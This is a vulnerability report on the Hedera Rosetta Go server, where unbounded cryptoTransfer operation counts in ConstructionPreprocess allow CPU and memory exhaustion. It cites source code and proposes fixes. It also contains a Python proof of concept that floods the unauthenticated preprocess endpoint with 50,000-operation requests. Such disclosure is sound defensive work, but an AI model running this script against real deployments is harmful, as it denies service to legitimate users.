### Title
Unbounded Operation Count in `ConstructionPreprocess` Enables CPU/Memory Exhaustion via CryptoTransfer Operations

### Summary
`ConstructionPreprocess()` accepts a `ConstructionPreprocessRequest` with an arbitrarily large `Operations` array and passes it directly to `getOperationSlice()` and then `transactionHandler.Preprocess()` without any per-request operation count limit. For `cryptoTransfer` operations, the downstream `validateOperations` call uses `size=0`, explicitly skipping the count check, allowing unbounded linear memory allocation and CPU iteration. No application-level body size cap (`http.MaxBytesReader`) exists in the Go server.

### Finding Description

**Exact code path:**

`ConstructionPreprocess()` at [1](#0-0)  calls `getOperationSlice(request.Operations)` with no guard on `len(request.Operations)`.

`getOperationSlice()` at [2](#0-1)  performs `make(types.OperationSlice, 0, len(operations))` and iterates every entry, allocating memory proportional to the attacker-controlled input size.

`compositeTransactionConstructor.validate()` at [3](#0-2)  only checks that the slice is non-empty and all operations share the same type — no count ceiling.

For `cryptoTransfer`, `validateOperations` is called with `size=0`: [4](#0-3) 

The `size != 0` guard at [5](#0-4)  means the count check is **entirely skipped** when `size=0`.

`cryptoTransferTransactionConstructor.preprocess()` then iterates all N operations, appending to `transfers`, writing into `senderMap`, and accumulating `totalAmounts` — all O(N): [6](#0-5) 

**No `http.MaxBytesReader` exists anywhere in the Rosetta Go server.** The HTTP server is constructed with only timeout fields and no body size limit: [7](#0-6) 

**Why existing checks fail:**
- `ReadTimeout` (default 5 s) limits read duration but not body size; on a 100 Mbps link an attacker can deliver ~62 MB within the window, encoding ~300 000 operations at ~200 bytes each.
- The Traefik `inFlightReq`/`rateLimit` middleware at [8](#0-7)  is optional Kubernetes infrastructure config, absent in bare deployments and bypassable by distributing requests across IPs.
- The Rosetta SDK asserter validates operation types but imposes no operation count ceiling.

### Impact Explanation
Each oversized request forces the server to allocate a large `OperationSlice`, a `transfers` slice, a `senderMap`, and a `totalAmounts` map — all proportional to N. Concurrent requests from a single attacker (or a small botnet) can exhaust heap memory and saturate a goroutine's CPU time, degrading or crashing the Rosetta API for all legitimate users. No funds are at risk; the impact is availability loss (griefing), consistent with the Medium severity classification.

### Likelihood Explanation
The `/construction/preprocess` endpoint is unauthenticated and reachable by any network peer. No special knowledge, credentials, or on-chain assets are required. The attack is trivially scriptable: craft a JSON body with tens of thousands of identical `cryptoTransfer` operations (all with the same type to pass the composite validator) and POST it in a loop. Repeatability is high; the attacker can sustain pressure indefinitely.

### Recommendation
1. **Add an application-level operation count cap** in `getOperationSlice()` or at the top of `ConstructionPreprocess()`:
   ```go
   const maxOperations = 1000 // or a configurable value
   if len(request.Operations) > maxOperations {
       return nil, errors.ErrInvalidOperations
   }
   ```
2. **Enforce an HTTP body size limit** in `main.go` using `http.MaxBytesReader` inside a middleware wrapper, e.g. 1 MB:
   ```go
   handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
       r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
       next.ServeHTTP(w, r)
   })
   ```
3. Make the Traefik `inFlightReq` and `rateLimit` middleware mandatory (not optional) in production deployment documentation.

### Proof of Concept
```python
import json, requests

# Build a request with 50,000 cryptoTransfer operations
ops = []
for i in range(50000):
    ops.append({
        "operation_identifier": {"index": i},
        "type": "CRYPTOTRANSFER",
        "account": {"address": f"0.0.{1000 + (i % 500)}"},
        "amount": {"value": "1" if i % 2 == 0 else "-1", "currency": {"symbol": "HBAR", "decimals": 8}}
    })

payload = {
    "network_identifier": {"blockchain": "Hedera", "network": "testnet"},
    "operations": ops
}

# Send to the unauthenticated endpoint
r = requests.post("http://<rosetta-host>:5700/construction/preprocess",
                  json=payload, timeout=30)
print(r.status_code, r.elapsed)
# Repeat concurrently to exhaust server memory/CPU
```

Sending 5–10 such concurrent requests (within the default 5-second `ReadTimeout`) forces the server to allocate and iterate millions of operation entries simultaneously, causing measurable latency spikes or OOM termination.

### Citations

**File:** rosetta/app/services/construction_service.go (L285-294)
```go
func (c *constructionAPIService) ConstructionPreprocess(
	ctx context.Context,
	request *rTypes.ConstructionPreprocessRequest,
) (*rTypes.ConstructionPreprocessResponse, *rTypes.Error) {
	operations, rErr := c.getOperationSlice(request.Operations)
	if rErr != nil {
		return nil, rErr
	}

	signers, err := c.transactionHandler.Preprocess(ctx, operations)
```

**File:** rosetta/app/services/construction_service.go (L432-465)
```go
func (c *constructionAPIService) getOperationSlice(operations []*rTypes.Operation) (
	types.OperationSlice,
	*rTypes.Error,
) {
	operationSlice := make(types.OperationSlice, 0, len(operations))
	for _, operation := range operations {
		var accountId types.AccountId
		if operation.Account != nil {
			var err error
			accountId, err = types.NewAccountIdFromString(operation.Account.Address, c.systemShard, c.systemRealm)
			if err != nil || accountId.IsZero() {
				return nil, errors.ErrInvalidAccount
			}
		}

		var amount types.Amount
		var rErr *rTypes.Error
		if operation.Amount != nil {
			if amount, rErr = types.NewAmount(operation.Amount); rErr != nil {
				return nil, rErr
			}
		}

		operationSlice = append(operationSlice, types.Operation{
			AccountId: accountId,
			Amount:    amount,
			Index:     operation.OperationIdentifier.Index,
			Metadata:  operation.Metadata,
			Type:      operation.Type,
		})
	}

	return operationSlice, nil
}
```

**File:** rosetta/app/services/construction/composite_transaction_constructor.go (L83-104)
```go
func (c *compositeTransactionConstructor) validate(operations types.OperationSlice) (
	transactionConstructorWithType,
	*rTypes.Error,
) {
	if len(operations) == 0 {
		return nil, errors.ErrEmptyOperations
	}

	operationType := operations[0].Type
	for _, operation := range operations[1:] {
		if operation.Type != operationType {
			return nil, errors.ErrMultipleOperationTypesPresent
		}
	}

	h, ok := c.constructorsByOperationType[operationType]
	if !ok {
		log.Errorf("Operation type %s is not supported", operationType)
		return nil, errors.ErrOperationTypeUnsupported
	}

	return h, nil
```

**File:** rosetta/app/services/construction/crypto_transfer_transaction_constructor.go (L125-127)
```go
	if err := validateOperations(operations, 0, c.GetOperationType(), false); err != nil {
		return nil, nil, err
	}
```

**File:** rosetta/app/services/construction/crypto_transfer_transaction_constructor.go (L129-151)
```go
	senderMap := senderMap{}
	totalAmounts := make(map[string]int64)
	transfers := make([]transfer, 0, len(operations))

	for _, operation := range operations {
		accountId := operation.AccountId
		amount := operation.Amount
		if amount.GetValue() == 0 {
			return nil, nil, errors.ErrInvalidOperationsAmount
		}

		sdkAccountId, err := accountId.ToSdkAccountId()
		if err != nil {
			return nil, nil, errors.ErrInvalidAccount
		}
		transfers = append(transfers, transfer{account: sdkAccountId, amount: amount})

		if amount.GetValue() < 0 {
			senderMap[accountId.String()] = accountId
		}

		totalAmounts[amount.GetSymbol()] += amount.GetValue()
	}
```

**File:** rosetta/app/services/construction/common.go (L123-125)
```go
	if size != 0 && len(operations) != size {
		return errors.ErrInvalidOperations
	}
```

**File:** rosetta/main.go (L220-227)
```go
	httpServer := &http.Server{
		Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
		Handler:           corsMiddleware,
		IdleTimeout:       rosettaConfig.Http.IdleTimeout,
		ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
		ReadTimeout:       rosettaConfig.Http.ReadTimeout,
		WriteTimeout:      rosettaConfig.Http.WriteTimeout,
	}
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L149-166)
```yaml
middleware:
  - circuitBreaker:
      expression: NetworkErrorRatio() > 0.25 || ResponseCodeRatio(500, 600, 0, 600) > 0.25
  - inFlightReq:
      amount: 5
      sourceCriterion:
        ipStrategy:
          depth: 1
  - rateLimit:
      average: 10
      sourceCriterion:
        requestHost: true
  - retry:
      attempts: 3
      initialInterval: 100ms
  - stripPrefix:
      prefixes:
        - "/rosetta"
```
